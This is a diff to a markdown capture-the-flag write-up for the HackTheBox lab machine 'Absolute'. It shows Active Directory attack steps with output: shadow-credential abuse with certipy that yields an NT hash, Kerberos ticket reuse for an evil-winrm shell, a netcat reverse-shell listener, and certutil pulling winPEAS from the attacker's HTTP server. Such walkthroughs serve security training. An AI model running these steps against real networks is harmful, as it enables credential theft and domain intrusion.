@@ -1,7 +1,7 @@
 ---
+icon: desktop
 hidden: true
 noIndex: true
-icon: desktop
 layout:
   title:
     visible: true
@@ -896,25 +896,149 @@ Hash.Target......: $krb5asrep$23$winrm_user@ABSOLUTE.HTB:764eee4e1c1d2...b40aad
 
 
 ```bash
-certipy-ad shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip 10.10.11.181 -target dc.absolute.htb -account winrm_user
+❯ certipy-ad shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip 10.10.11.181 -target dc.absolute.htb -account winrm_user
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Targeting user 'winrm_user'
 [*] Generating certificate
 [*] Certificate generated
 [*] Generating Key Credential
-[*] Key Credential generated with DeviceID '32530448-a4c9-745b-059c-18ba472dc78f'
-[*] Adding Key Credential with device ID '32530448-a4c9-745b-059c-18ba472dc78f' to the Key Credentials for 'winrm_user'
-[*] Successfully added Key Credential with device ID '32530448-a4c9-745b-059c-18ba472dc78f' to the Key Credentials for 'winrm_user'
+[*] Key Credential generated with DeviceID '998d522e-a045-2dd1-ca6a-d58050fda221'
+[*] Adding Key Credential with device ID '998d522e-a045-2dd1-ca6a-d58050fda221' to the Key Credentials for 'winrm_user'
+[*] Successfully added Key Credential with device ID '998d522e-a045-2dd1-ca6a-d58050fda221' to the Key Credentials for 'winrm_user'
 [*] Authenticating as 'winrm_user' with the certificate
 [*] Using principal: winrm_user@absolute.htb
 [*] Trying to get TGT...
+[*] Got TGT
 [*] Saved credential cache to 'winrm_user.ccache'
 [*] Trying to retrieve NT hash for 'winrm_user'
 [*] Restoring the old Key Credentials for 'winrm_user'
 [*] Successfully restored the old Key Credentials for 'winrm_user'
-[*] NT hash for 'winrm_user': None
+[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
 ```
+
+
+
+
+
+```
+❯ evil-winrm -i 10.10.11.181 -u 'winrm_user' -H '8738c7413a5da3bc1d083efc0ab06cb2'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+                                        
+Error: Exiting with code 1
+
+```
+
+
+
+<figure><img src="../../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>
+
+
+
+```
+❯ export KRB5CCNAME=$(pwd)/winrm_user.ccache
+❯ klist -i
+Ticket cache: FILE:/home/kali/Desktop/HackTheBox/Windows/AD/Absolute/Absolute/content/winrm_user.ccache
+Default principal: winrm_user@ABSOLUTE.HTB
+
+Valid starting     Expires            Service principal
+10/02/25 04:52:28  10/02/25 08:52:28  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
+	renew until 10/02/25 08:52:28
+```
+
+
+
+```
+❯ nxc smb 10.10.11.181 -k --use-kcache
+SMB         10.10.11.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.181    445    DC               [+] absolute.htb\winrm_user from ccache 
+```
+
+
+
+```bash
+❯ evil-winrm -i dc.absolute.htb -r absolute.htb
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\winrm_user\Documents> whoami
+absolute\winrm_user
+```
+
+
+
+```
+❯ rlwrap -cAr nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.16.7] from (UNKNOWN) [10.10.11.181] 51372
+Microsoft Windows [Version 10.0.17763.3406]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\ProgramData>whoami
+whoami
+absolute\winrm_user
+```
+
+
+
+```
+❯ ls -l winPEASx64.exe
+.rw-r--r-- kali kali 9.4 MB Mon Feb 10 05:03:21 2025  winPEASx64.exe
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+
+
+```
+C:\ProgramData>certutil.exe -f -urlcache -split http://10.10.16.7/winPEASx64.exe winPEASx64.exe
+certutil.exe -f -urlcache -split http://10.10.16.7/winPEASx64.exe winPEASx64.exe
+****  Online  ****
+  000000  ...
+  962e00
+
+
+CertUtil: -URLCache command completed successfully.
+```
+
+
+
+
+
+```
+❯ ls -l *.exe
+.rw-r--r-- kali kali 1.1 MB Mon Feb 10 05:02:29 2025  KrbRelayUp.exe
+.rw-r--r-- kali kali 436 KB Mon Feb 10 05:02:44 2025  Rubeus.exe
+.rw-r--r-- kali kali  50 KB Mon Feb 10 05:02:37 2025  RunasCs.exe
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
